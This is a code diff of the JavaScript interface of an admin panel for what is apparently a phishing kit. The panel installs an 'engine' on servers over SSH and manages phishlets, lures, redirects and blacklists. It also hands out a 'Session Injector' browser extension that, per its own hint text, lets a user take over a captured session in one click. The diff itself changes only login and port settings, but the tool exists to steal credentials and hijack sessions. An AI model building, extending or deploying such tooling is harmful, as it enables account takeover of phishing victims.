@@ -150,21 +150,26 @@ async function viewSettings() {
       '<label class="switch mb14"><input type="checkbox" id="sAuto"' + (s.auto_build ? ' checked' : '') + '><span class="track"></span><span class="muted">Auto-build with local Go when a binary is missing</span></label>' +
       '<div class="actions"><button class="btn primary" data-act="save-settings">Save</button><button class="btn" data-act="build">Build binaries now</button></div>' +
     '</div></div>' +
-    '<div class="card"><div class="card-head"><h3>Panel</h3></div><div style="padding:16px"><div class="kv">' +
-      '<span class="k">Version</span><span class="v">' + esc(s.version) + '</span>' +
-      '<span class="k">Host</span><span class="v">' + esc(s.host) + '</span>' +
-      '<span class="k">Auth</span><span class="v">' + (s.auth ? 'enabled' : 'DISABLED') + '</span>' +
-      '<span class="k">Store</span><span class="v">' + esc(s.store) + '</span>' +
-      '<span class="k">Uptime</span><span class="v">' + Math.floor(s.uptime / 60) + 'm</span>' +
-    '</div>' +
-    '<div class="actions mt14"><button class="btn sm" data-act="ext">Download Session Injector (.zip)</button></div>' +
-    '<div class="hint mt8">Give this extension + the Dashboard link to whoever views sessions.</div>' +
+    '<div class="card"><div class="card-head"><h3>Panel login &amp; port</h3><span class="badge ' + (s.pass_set ? 'ok' : 'warn') + '">' + (s.pass_set ? 'login on' : 'open - set a password') + '</span></div><div style="padding:16px">' +
+      '<div class="field"><label>Listen address</label><input id="pBind" value="' + esc(s.bind) + '"><span class="hint">127.0.0.1:8080 = this computer only · 0.0.0.0:8080 = reachable from the network</span></div>' +
+      '<div class="row"><div class="field"><label>Username</label><input id="pUser" value="' + esc(s.user) + '"></div>' +
+      '<div class="field"><label>Password</label><input id="pPass" type="text" placeholder="' + (s.pass_set ? 'unchanged' : 'set one') + '"></div></div>' +
+      '<div class="actions mb14"><button class="btn primary" data-act="save-panel">Save</button><button class="btn" data-act="restart-panel">Restart panel</button></div>' +
+      '<div class="kv">' +
+        '<span class="k">Version</span><span class="v">' + esc(s.version) + '</span>' +
+        '<span class="k">Folder</span><span class="v">' + esc(s.root) + '</span>' +
+        '<span class="k">Settings file</span><span class="v">' + esc(s.store) + '</span>' +
+        '<span class="k">Uptime</span><span class="v">' + Math.floor(s.uptime / 60) + 'm</span>' +
+      '</div>' +
+      '<div class="actions mt14"><button class="btn sm" data-act="ext">Download Session Injector (.zip)</button></div>' +
+      '<div class="hint mt8">The extension is what lets a user take over a session in one click. A port change needs <b>Restart panel</b>.</div>' +
     '</div></div>' +
     '<div class="card"><div class="card-head"><h3>How it works</h3></div><div style="padding:16px" class="muted">' +
       '<p>1. Add a server (IP + root password or SSH key).</p>' +
       '<p>2. Click <b>Install</b> — the panel connects over SSH, installs the engine, writes config, opens the firewall, starts the service and verifies it.</p>' +
-      '<p>3. Give the user the <b>Dashboard</b> link + the extension below.</p>' +
-      '<p class="mt8">Each server keeps its own Dashboard. The Dashboard is what the end user opens; this panel never exposes their sessions.</p>' +
+      '<p>3. Click <b>Manage</b> to control phishlets, lures, redirects, blacklist and settings.</p>' +
+      '<p>4. Give the user the <b>Dashboard</b> link + the extension below.</p>' +
+      '<p class="mt8">Everything lives in this one folder — copy it anywhere and it keeps working.</p>' +
     '</div></div>' +
   '</div>';
 }
@@ -329,6 +334,23 @@ var ACTIONS = {
   job: function (id) { jobModal(id); },
   ext: function () { window.open('/api/extension.zip'); },
   'save-settings': function () { run(async function () { await API.post('/api/settings', { repo_dir: $('#sRepo').value, bin_amd64: $('#sAmd').value, bin_arm64: $('#sArm').value, auto_build: $('#sAuto').checked }); toast('saved', 'ok'); }); },
+  'save-panel': function () {
+    run(async function () {
+      var body = { bind: $('#pBind').value.trim(), user: $('#pUser').value.trim() };
+      var p = $('#pPass').value;
+      if (p !== '') body.pass = p;
+      var r = await API.post('/api/panel/settings', body);
+      toast(r.restart_needed ? 'saved - click Restart panel to apply the port' : 'saved', 'ok');
+      render();
+    });
+  },
+  'restart-panel': function () {
+    run(async function () {
+      await API.post('/api/panel/restart');
+      toast('restarting…', 'info');
+      setTimeout(function () { location.reload(); }, 1800);
+    });
+  },
   build: function () { run(async function () { var r = await API.post('/api/build'); jobModal(r.job); }); },
   theme: function () { var c = document.documentElement.getAttribute('data-theme') === 'light' ? 'dark' : 'light'; document.documentElement.setAttribute('data-theme', c); localStorage.setItem('theme', c); }
 };
